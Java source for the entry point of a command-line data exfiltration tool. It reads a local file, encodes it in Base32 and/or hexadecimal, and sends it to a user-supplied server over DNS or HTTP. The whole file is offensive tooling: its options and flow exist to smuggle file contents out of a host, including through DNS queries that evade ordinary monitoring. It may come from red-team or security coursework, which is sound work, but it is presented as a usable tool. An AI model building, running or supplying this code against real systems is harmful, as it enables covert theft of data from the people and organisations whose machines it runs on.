package com.hase505;
import com.hase505.entities.ExfiltrationData;
import com.hase505.entities.ExfiltrationFile;
import com.hase505.strategies.encode.Base32Strategy;
import com.hase505.strategies.encode.CompositeEncodingStrategy;
import com.hase505.strategies.encode.HexadecimalStrategy;
import com.hase505.strategies.send.DNSSendStrategy;
import com.hase505.strategies.send.HTTPSendStrategy;
import org.apache.commons.cli.*;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class App {
    public static void main( String[] args ) {
        final String tool_version = "1.0";
        ExfiltrationData exfiltrationData = null;
        String userServer;
        File localFile;
        String encodedData;

        // Declaração de opções sem argumentos
        Option help = new Option("h", "Print tool usage");
        Option version = new Option("V", "Display tool version");

        //Declaração de opções com argumentos
        Option server = Option.builder("u")
                .argName("server")
                .hasArg()
                .desc("Exfiltration server IP or domain.")
                .build();

        Option file = Option.builder("f")
                .argName("file")
                .hasArg()
                .desc("File to exfiltrate.")
                .build();

        Option protocol = Option.builder("p")
                .argName("protocol")
                .hasArg()
                .desc("Protocol used to exfiltrate data.")
                .build();

        Option encoding = Option.builder("e")
                .argName("encoding(s)")
                .hasArg()
                .desc("Encoding types. It's possible to pass multiple encodings.")
                .build();

        // Criação do objeto que armazena as opções
        Options options = new Options();

        // Adição das opções
        options.addOption(help);
        options.addOption(version);
        options.addOption(server);
        options.addOption(file);
        options.addOption(protocol);
        options.addOption(encoding);

        //Criação do parser
        CommandLineParser parser = new DefaultParser();
        if (args.length == 0) {
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("Main", options);
            return;
        }

        try{
            CommandLine line = parser.parse(options,args);

            if(line.hasOption("h")){
                HelpFormatter formatter = new HelpFormatter();
                formatter.printHelp("Main", options);
                return;
            }

            if(line.hasOption("V")){
                System.out.println("Version: " + tool_version);
                return;
            }

            // Checar se informou o servidor
            if(line.hasOption("u")){
                userServer = line.getOptionValue("u");
            }
            else{
                System.err.println("Incorrect options.");
                return;
            }

            // Checar se informou o arquivo
            if(line.hasOption("f")){
                localFile = new File(line.getOptionValue("f"));

                //Verificar se é um arquivo válido
                if(!localFile.isFile()){
                    System.err.println("File doesn't exist");
                    return;
                }
                //Verificar se o arquivo pode ser lido
                if(!localFile.canRead()){
                    System.err.println("File doesn't have read permission");
                    return;
                }
                exfiltrationData = new ExfiltrationFile(
                        Files.readAllBytes(localFile.toPath()),
                        line.getOptionValue("f"),
                        line.getOptionValue("f"));
            }
            else{
                System.err.println("Incorrect options.");
                return;
            }

            // Checar se informou o protocolo
            if(line.hasOption("p")){
                switch (line.getOptionValue("p")){
                    case "dns":
                        exfiltrationData.setSendStrategy(new DNSSendStrategy(40, userServer));
                        break;
                    case "http":
                        exfiltrationData.setSendStrategy(new HTTPSendStrategy(userServer));
                        break;
                    default:
                        System.err.println("Incorrect protocol option.");
                        return;
                }
            }
            else{
                System.err.println("Incorrect options.");
                return;
            }

            // Checar se informou o encoding
            if(line.hasOption("e")){
                //Se houver mais de uma codificação
                if(line.getOptionValue("e").length() > 1){
                    CompositeEncodingStrategy composite = new CompositeEncodingStrategy();
                    String encodings = line.getOptionValue("e");
                    for(int i=0; i < encodings.length(); i++){
                        //Verificar se há alguma codificação incorreta
                        if((encodings.charAt(i))!='b' && (encodings.charAt(i)!='h')){
                            System.err.printf("Invalid encoding option: %c\n", i);
                            return;
                        }

                        if(encodings.charAt(i) == 'b') {
                            composite.addStrategy(new Base32Strategy());
                        } else if (encodings.charAt(i) == 'h') {
                            composite.addStrategy(new HexadecimalStrategy());
                        }
                    }
                    exfiltrationData.setEncodeStrategy(composite);

                }
                //Se for informado apenas uma opção de codificação
                else{
                    //Verificar se há alguma codificação incorreta
                    if((line.getOptionValue("e").charAt(0) != 'b') && (line.getOptionValue("e").charAt(0) != 'h')){
                        System.err.printf("Invalid encoding option: %c\n", line.getOptionValue("e").charAt(0));
                        return;
                    }

                    if(line.getOptionValue("e").charAt(0) == 'b'){
                        exfiltrationData.setEncodeStrategy(new Base32Strategy());
                    } else if (line.getOptionValue("e").charAt(0) == 'h') {
                        exfiltrationData.setEncodeStrategy(new HexadecimalStrategy());
                    }
                }
            } else{
                System.err.println("Incorrect options.");
                return;
            }

        }catch (ParseException | IOException e){
            System.err.println("Parsing failed: " + e.getMessage());
        }

        if (exfiltrationData != null) {
            exfiltrationData.sendEncodedData();
        } else {
            System.err.println("Exfiltration data is null, cannot send encoded data.");
        }


    }
}
